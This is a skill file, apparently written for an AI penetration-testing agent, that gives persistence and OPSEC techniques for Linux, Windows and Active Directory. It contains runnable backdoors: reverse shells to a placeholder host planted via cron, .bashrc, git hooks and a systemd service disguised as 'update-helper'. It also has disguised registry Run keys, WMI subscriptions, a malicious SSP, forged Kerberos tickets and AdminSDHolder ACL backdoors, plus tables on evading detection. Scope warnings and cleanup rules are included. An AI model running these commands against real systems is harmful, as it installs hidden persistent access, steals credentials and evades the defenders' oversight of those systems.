---
name: persistence_opsec
description: Persistence techniques (Linux/Windows/AD — services, WMI, hijacking, SSP, tickets, AdminSDHolder/DCShadow) and operational security — noise management, log awareness, artifact cleanup, evidence chain preservation. Only use persistence if engagement scope allows it.
---

# Persistence & OPSEC

## Persistence

⚠️ **Only if engagement scope explicitly allows persistence.** If unsure, skip persistence and document instead.

### Linux Persistence

```bash
# SSH authorized_keys (simplest, most common)
echo "<your_public_key>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Cron job (runs periodically)
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'") | crontab -

# Systemd service (persistent across reboots)
sudo tee /etc/systemd/system/update-helper.service << 'EOF'
[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload && sudo systemctl enable update-helper

# Systemd timer (stealthier than cron)
sudo tee /etc/systemd/system/cleanup.timer << 'EOF'
[Unit]
Description=Cleanup Timer
[Timer]
OnCalendar=*:0/10
[Install]
WantedBy=timers.target
EOF

# bashrc (triggers on shell login)
echo '[[ $- == *i* ]] && (/bin/bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1" &) &>/dev/null' >> ~/.bashrc

# LD_PRELOAD hook (runs on every dynamic binary)
echo "/path/to/hook.so" | sudo tee -a /etc/ld.so.preload
```

### Further Linux mechanisms (scope-gated like the rest)

```bash
# PAM module backdoor — replace/append to a PAM stack (pam_unix.so path)
# Captures every future authentication; restore the exact original module

# Git hook (if a root-run process deploys from a repo you can write)
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<ip>/<port> 0>&1' > .git/hooks/post-merge
chmod +x .git/hooks/post-merge

# Web shell on an existing web root (when write access exists)
# Keep one file, name it to blend, record it for removal
```

### Windows Persistence

```powershell
# Registry Run key (runs at logon)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\temp\shell.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\temp\shell.exe" /f

# Scheduled task
schtasks /create /tn "SystemCleanup" /tr "C:\temp\shell.exe" /sc minute /mo 5 /ru SYSTEM /f

# Service (persistent, starts at boot)
sc create "WindowsHelper" binpath= "C:\temp\shell.exe" start= auto
net start WindowsHelper

# WMI event subscription (fileless, stealthy)
# Requires PowerShell
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
    Name = "CleanupFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
    Name = "CleanupConsumer"
    CommandLineTemplate = "C:\temp\shell.exe"
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# Startup folder
copy shell.exe "C:\Users\All Users\Start Menu\Programs\Startup\"
```

### DLL / COM Hijacking (no new artifacts on disk)

```powershell
# DLL search-order: place a payload DLL earlier in PATH or in the app dir
# (an unwritable-signed binary that loads a missing/writable DLL)
# COM: hijack a HKCU overridable CLSID used by a privileged process
reg query HKCR\<CLSID>\InProcServer32   # if resolved per-user under
                                        # HKCU\Software\Classes\<CLSID>, point it at your DLL
```

Prefer these over service creation when stealth matters — but they are
harder to clean: record the exact DLL path / CLSID and original value in the
campaign ledger before the change.

### Security Support Provider (SSP)

```powershell
# Add a malicious SSP (e.g. mimilib.dll) — captures all logons in plaintext
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "mimilib.dll" /f
# Requires reboot; removal = restore the original multi-string exactly
```

### AD Persistence (requires DA)

```bash
# Golden ticket (krbtgt hash → forge tickets forever)
impacket-ticketer -domain corp.local -nthash <krbtgt_ntlm> -domain-sid <SID> administrator

# Diamond ticket (more stealthy than golden)
impacket-ticketer -request -domain corp.local -user user -password pass -nthash <krbtgt>

# Silver ticket — service-scoped, needs only the service account's hash
impacket-ticketer -nthash <SVC_HASH> -domain-sid S-1-5-21-... -domain corp.local \
  -spn cifs/fileserver.corp.local administrator

# Skeleton key (injects master password on DC, requires mimikatz on DC)
# All domain accounts accept password "skeleton"
```

### ACL and replication persistence (DA required)

```powershell
# AdminSDHolder: SDProp re-applies this ACL to every protected group hourly
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity backdooruser -Rights All

# SID History: append a DA group SID to a normal user (needs DC access)
# mimikatz: sid::add /sam:backdooruser /new:S-1-5-21-...-512

# DCShadow: register a rogue DC to push arbitrary replication changes
# (two mimikatz sessions; extremely high privilege, very visible in monitoring)
```

These survive host reimaging — they are the strongest artifacts you can
create. Every one of them must be recorded (`artifact_created` /
`resource_retained`) with an exact removal plan, and called out in the final
report; leaving an AdminSDHolder ACL behind is a finding against yourself.

## OPSEC

### Noise Management

| Action | Noise level | Mitigation |
|---|---|---|
| Port scan (full subnet) | High | Use targeted ports, slow scan |
| Password spray | High | Limited attempts, long intervals |
| Service creation | Medium | Delete after use |
| Registry modification | Medium | Use HKCU over HKLM when possible |
| Log deletion | High | Don't — too suspicious |
| DNS tunneling | High | Last resort only |

### Windows Event Log Awareness

| Event ID | Triggered by | Detection risk |
|---|---|---|
| 4624 | Successful logon | Normal |
| 4625 | Failed logon | Password spray detection |
| 4672 | Special privileges assigned | Admin logon |
| 4688 | Process creation | Command execution |
| 4698 | Scheduled task created | Persistence detection |
| 7045 | Service installed | PsExec/service creation |
| 4697 | Service installed (security) | Service creation |
| 5140 | Network share accessed | Share enumeration |
| 5145 | Network share checked | Share mapping |

### Linux Log Awareness

```bash
# Check what logs exist
ls /var/log/ /var/log/audit/ 2>/dev/null

# Key files to be aware of:
# /var/log/auth.log (Debian) or /var/log/secure (RHEL) — SSH/sudo
# /var/log/syslog — system events
# /var/log/audit/audit.log — auditd (if configured)
# ~/.bash_history — command history
# /var/log/cron — cron executions
```

### Traffic Minimization

```bash
# Prefer specific port checks over full scans
nc -zv <target> 445      # instead of nmap full subnet

# Use nmap timing flags
nmap -T2 --max-rate 50   # slow scan

# Limit NetExec threads
nxc smb <target> --threads 1
```

### Artifact Cleanup

Before making any change, identify its exact host, path/account/service identifier
and save the original state. After the change succeeds and its result is verified,
use `record_internal_event` with `artifact_created`,
`artifact_modified` or `account_created`; include `details.evidence` and, for
modifications, a `details.restore_plan` identifying the saved original value.
Retain the returned `resource_id`. Check for pre-existing names before creating
an artifact; examples earlier in this skill are not permission to overwrite an
existing service, registry value, file or schedule.

At the end of an assignment, or when handing off a host:

1. Read `get_internal_campaign` and identify this engagement's open changes.
2. Verify evidence copies are saved before removing temporary copies we created.
3. Remove only the exact files, accounts, processes and schedule entries created
   by this engagement. Identify process ownership before stopping anything;
   retain access routes that another agent or the operator still needs.
4. Restore changed configuration entries to their recorded original values.
   Preserve unrelated cron entries, authorized keys, services and registry data.
   If the current state differs from both the saved baseline and our change,
   record the conflict rather than overwriting someone else's update.
5. Verify the result and record `artifact_removed`, `artifact_restored` or
   `account_removed` using the original `resource_id`, host and subject.
6. Report blocked cleanup and intentionally retained changes. Retention requires
   explicit operator permission referenced in `details.authorization` together
   with `details.persistent=true`.
   Use `resource_retained` with the original `resource_id` if retention is
   authorized after the resource was first recorded; retention is not cleanup.

Preserve shell history, system/security events and audit logs. Do not use wildcard
deletion or remove an entire crontab to undo one entry. Cleanup is restoration of
our recorded changes, not removal of evidence of the assessment.

## Evidence Chain

### File Preservation

```bash
# ALL evidence files → /workspace/output/
# Include metadata:
echo "SHA256: $(sha256sum /workspace/output/dump.txt)" >> /workspace/output/dump.txt.meta
echo "Source: 10.0.0.10 via secretsdump" >> /workspace/output/dump.txt.meta
echo "Date: $(date -u '+%Y-%m-%d %H:%M:%S UTC')" >> /workspace/output/dump.txt.meta
```

### Report Integration

Every credential dump referenced in a finding should:
1. Reference the specific file: `/workspace/output/secretsdump_corp.txt`
2. Include the full SHA256 for integrity verification
3. State the source (which host, which tool, which technique)
4. List key entries found (not the entire dump — that's in the file)

### What NOT to Do

- Remove only temporary dumps we created, after verifying the saved evidence copy
- Don't delete logs (too suspicious, breaks evidence chain)
- Don't truncate large dumps — save full files to `/workspace/output/`
- Don't include actual passwords in internal finding titles (use content field)
